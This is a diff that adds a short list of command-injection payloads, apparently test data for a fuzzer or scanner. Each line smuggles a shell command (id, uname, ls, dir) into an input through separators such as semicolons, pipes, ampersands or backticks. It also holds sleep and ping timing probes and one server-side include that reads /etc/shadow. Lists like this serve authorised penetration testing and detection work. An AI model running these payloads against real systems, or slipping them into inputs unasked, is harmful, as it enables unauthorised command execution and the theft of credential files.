@@ -1,0 +1,30 @@
+&&+|+dir c:",12,cmdi,anom $&&dir c:"
+$+|+dir+c:/
++dir+c:/
++|+dir+c:/+|
+<!--#exec cmd="/bin/cat /etc/shadow"-->
+;id;
+|id
+|/usr/bin/id|
+||/usr/bin/id;
+/bin/ls -al
+/usr/bin/id;
+id|
+|nid
+a);id
+a;id;
+a)|id
+|/bin/ls -al
+a);/usr/bin/id;
+a;/usr/bin/id|
+a)|/usr/bin/id;
+;system('/usr/bin/id')
+& ping -n 30 127.0.0.1 &
+| id
+$;/usr/bin/id
+'uname'
+"`uname`"
+`uname`
+" ; /bin/sleep 31 ;
+"| /bin/sleep 31 ;
+" ping.exe -n 31 127.0.0.1
